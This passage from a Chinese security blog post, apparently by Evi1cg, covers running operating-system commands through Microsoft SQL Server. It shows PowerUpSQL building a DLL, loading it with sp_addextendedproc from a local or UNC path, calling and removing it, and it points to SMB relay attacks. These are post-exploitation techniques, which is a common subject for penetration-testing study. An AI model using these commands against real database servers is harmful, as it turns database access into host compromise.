+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/1131735677.png" alt="1486709327428.png"></p>
+<blockquote>
+<p>如果没成功，可以换个数据库试试看。</p>
+</blockquote>
+<p>11、删除存储过程<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DROP <span class="function"><span class="keyword">PROCEDURE</span> [<span class="title">dbo</span>].[<span class="title">SqlStoredProcedure1</span>];</span></span><br><span class="line">DROP <span class="keyword">ASSEMBLY</span> ExecCode;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x04-PowerUpSQL"><a href="#0x04-PowerUpSQL" class="headerlink" title="0x04 PowerUpSQL"></a>0x04 PowerUpSQL</h2><p>当然针对SQL Server的攻击，有一个强大的工具<a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">PowerUpSQL</a>，里面也有很多针对MSSQL的攻击方式。下面介绍两种比较实用的方式。</p>
+<h3 id="1-SP-Addextendedproc"><a href="#1-SP-Addextendedproc" class="headerlink" title="1. SP_Addextendedproc"></a>1. SP_Addextendedproc</h3><p>套件中的<code>Create-SQLFileXpDll</code>方法，在这里对其使用方式简单的进行一下介绍。<br>创建DLL：<br><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="tag">\<span class="name">Users</span></span><span class="tag">\<span class="name">Evi</span></span>1cg<span class="tag">\<span class="name">Desktop</span></span><span class="tag">\<span class="name">PowerUpSQL</span></span>&gt; . .<span class="tag">\<span class="name">PowerUpSQL</span></span>.ps1</span><br><span class="line">PS C:<span class="tag">\<span class="name">Users</span></span><span class="tag">\<span class="name">Evi</span></span>1cg<span class="tag">\<span class="name">Desktop</span></span><span class="tag">\<span class="name">PowerUpSQL</span></span>&gt; Create-SQLFileXpDll -OutFile D:<span class="tag">\<span class="name">temp</span></span><span class="tag">\<span class="name">exec</span></span>.dll -Command "echo Exec test &gt; D:<span class="tag">\<span class="name">temp</span></span><span class="tag">\</span></span><br><span class="line">test.txt" -ExportName xp_test</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/2291071196.png" alt="1486710039861.png"></p>
+<p>SQL Server 通过 sp_addextendedproc 调用DLL从而达到命令执行的效果。这里有两种方式导入：<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//via local disk</span></span><br><span class="line">sp_addextendedproc 'xp_test', 'D:\temp\exec.dll'</span><br><span class="line"><span class="comment">//via UNC path:</span></span><br><span class="line">sp_addextendedproc 'xp_test', '\\servername\pathtofile\exec.dll'</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/1217107479.png" alt="1486710443785.png"></p>
+<p>导入之后的可调用xp_test来执行命令：<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">exec</span></span> master..xp_test;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/02/2171763907.png" alt="1486710515667.png"></p>
+<p>通过以下命令可以卸载：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sp_dropextendedproc</span> <span class="string">'xp_test'</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="2-SMB-Relay-Attacks"><a href="#2-SMB-Relay-Attacks" class="headerlink" title="2. SMB Relay Attacks"></a>2. SMB Relay Attacks</h3><p>针对这种方式，已经有文章总结了，这里就不多做介绍了，详细请看<a href="https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/" target="_blank" rel="noopener">这里</a>。</p>
+<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>本文就通过SQL Server 执行系统命令进行了一下小结，当然方式可能不全，仅仅是自己知道的一些方法，还希望大牛别喷，如果您有什么更加新颖的方法，欢迎补充，希望本文对你有所帮助。</p>
+<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p>1.<a href="http://bobao.360.cn/learning/detail/3070.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3070.html</a><br>2.<a href="https://www.mssqltips.com/sqlservertip/2087/how-to-execute-a-dos-command-when-xpcmdshell-is-disabled-in-sql-server/" target="_blank" rel="noopener">https://www.mssqltips.com/sqlservertip/2087/how-to-execute-a-dos-command-when-xpcmdshell-is-disabled-in-sql-server/</a><br>3.<a href="http://blog.csdn.net/tjvictor/article/details/4726933" target="_blank" rel="noopener">http://blog.csdn.net/tjvictor/article/details/4726933</a><br>4.<a href="https://www.mssqltips.com/sqlservertip/1662/writing-to-an-operating-system-file-using-the-sql-server-sqlclr/" target="_blank" rel="noopener">https://www.mssqltips.com/sqlservertip/1662/writing-to-an-operating-system-file-using-the-sql-server-sqlclr/</a><br>5.<a href="https://www.t00ls.net/viewthread.php?tid=23198&amp;extra=page%3D1%26amp%3Bfilter%3Dtype%26amp%3Btypeid%3D39" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=23198&amp;extra=page%3D1%26amp%3Bfilter%3Dtype%26amp%3Btypeid%3D39</a></p>
+
+      
+    </div>
+
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------本文结束，感谢阅读------</div>
+    
+</div>
+    
+    </div>
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Evi1cg</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://evi1cg.github.io/archives/Exec_OS_Command_Via_MSSQL.html" title="Exec OS Command Via MSSQL">https://evi1cg.github.io/archives/Exec_OS_Command_Via_MSSQL.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/mssql/" rel="tag"># mssql</a>
+          
+            <a href="/tags/exec-command/" rel="tag"># exec command</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/xxe_with_xsl.html" rel="next" title="XXE with XSL">
+                <i class="fa fa-chevron-left"></i> XXE with XSL
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/archives/LFI.html" rel="prev" title="LFI SSH日志">
+                LFI SSH日志 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+
+      
+      
+    </footer>
+
+  
+    <br>
+    <div style="text-align:center" class="addthis_inline_share_toolbox">
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5c40967aab5e187f"></script>
+    </div>
+  
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+            
+            <a href="/">
+              <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif" alt="Evi1cg">
+            
+            </a>
+              <p class="site-author-name" itemprop="name">Evi1cg</p>
+              <p class="site-description motion-element" itemprop="description">此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archive">
+                
+                    <span class="site-state-item-count">98</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">51</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:zuotonghk@gmail.com" title="Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          <div id="days"></div>
+<script>
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("09/17/2015 15:13:14");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-简介"><span class="nav-number">1.</span> <span class="nav-text">0x00 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-常用的一些姿势"><span class="nav-number">2.</span> <span class="nav-text">0x01 常用的一些姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-XP-CMDSHELL"><span class="nav-number">2.1.</span> <span class="nav-text">1. XP_CMDSHELL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-SP-OACREATE"><span class="nav-number">2.2.</span> <span class="nav-text">2. SP_OACREATE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-自启动"><span class="nav-number">2.3.</span> <span class="nav-text">3. 自启动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-通过沙盒执行命令"><span class="nav-number">2.4.</span> <span class="nav-text">4. 通过沙盒执行命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-通过Agent-Job执行命令"><span class="nav-number">3.</span> <span class="nav-text">0x02 通过Agent Job执行命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-SQL-Server-CLR"><span class="nav-number">4.</span> <span class="nav-text">0x03 SQL Server CLR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-PowerUpSQL"><span class="nav-number">5.</span> <span class="nav-text">0x04 PowerUpSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-SP-Addextendedproc"><span class="nav-number">5.1.</span> <span class="nav-text">1. SP_Addextendedproc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-SMB-Relay-Attacks"><span class="nav-number">5.2.</span> <span class="nav-text">2. SMB Relay Attacks</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-小结"><span class="nav-number">6.</span> <span class="nav-text">0x05 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-参考"><span class="nav-number">7.</span> <span class="nav-text">0x06 参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+    <div style="display: none;"><a href="https://www.whoxy.com/"><img src="//whoxy.s3.amazonaws.com/x.png" alt="whois api"></a></div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Evi1cg</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="//cdn.jsdelivr.net/npm/jquery@2/dist/jquery.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+  
+
+<script src="//cdn.jsdelivr.net/npm/leancloud-storage@3/dist/av-min.js"></script>
+
+
+
+  
+
+<script src="//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 's1f976yBJAt2jkwXyp1klYGM-gzGzoHsz',
+    appKey: 'aQhe3medX27hXiDgPHMCjzMB',
+    placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+    avatar: '',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false
+  });
+   //新增以下代码即可，可以移除.info下所有子节点。
+  var infoEle = document.querySelector('#comments .info');
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0){
+  infoEle.childNodes.forEach(function(item) {
+    item.parentNode.removeChild(item);
+  });}
+</script>
+
+
+
+
+  
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+      }
+      else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function(i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap');
+      $(e).after($wrap);
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+        var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+          return $(e).text();
+        }).toArray().join('\n');
+        var ta = document.createElement('textarea');
+        var range = document.createRange(); //For Chrome
+        var sel = window.getSelection(); //For Chrome
+        var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+        ta.style.top = yPosition + 'px'; //Prevent page scroll
+        ta.style.position = 'absolute';
+        ta.style.opacity = '0';
+        ta.value = code;
+        ta.textContent = code; //For FireFox
+        ta.contentEditable = true;
+        ta.readOnly = false;
+        document.body.appendChild(ta);
+        range.selectNode(ta);
+        sel.removeAllRanges();
+        sel.addRange(range);
+        ta.setSelectionRange(0, code.length);
+        var result = document.execCommand('copy');
+        
+          if (result) $(this).text('复制成功');
+          else $(this).text('复制失败');
+        
+        ta.blur(); //For iOS
+        $(this).blur();
+      })).on('mouseleave', function(e) {
+        var $b = $(this).find('.copy-btn');
+        setTimeout(function() {
+          $b.text('复制');
+        }, 300);
+      }).append(e);
+    })
+  </script>
+
+
+  
+
